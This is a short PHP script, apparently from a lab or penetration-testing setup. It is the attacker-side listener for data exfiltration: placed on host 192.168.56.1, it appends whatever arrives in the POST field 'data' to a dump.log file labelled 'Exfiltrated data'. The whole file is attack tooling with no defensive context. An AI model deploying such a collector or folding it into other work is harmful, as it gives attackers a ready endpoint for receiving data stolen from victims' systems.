<?php
// index.php file in 192.168.56.1 home directory
// file dump.log written in the same dir (adjust your permission)
$file = fopen("dump.log","a") or die ("Cannot create dump file");
fwrite ($file, "Dumping POST vars\n\n");
fwrite ($file, "============================\n");
fwrite ($file, "Exfiltrated data: ".$_POST["data"]."\n");
fwrite ($file, "============================\n");
fclose ($file);
?>
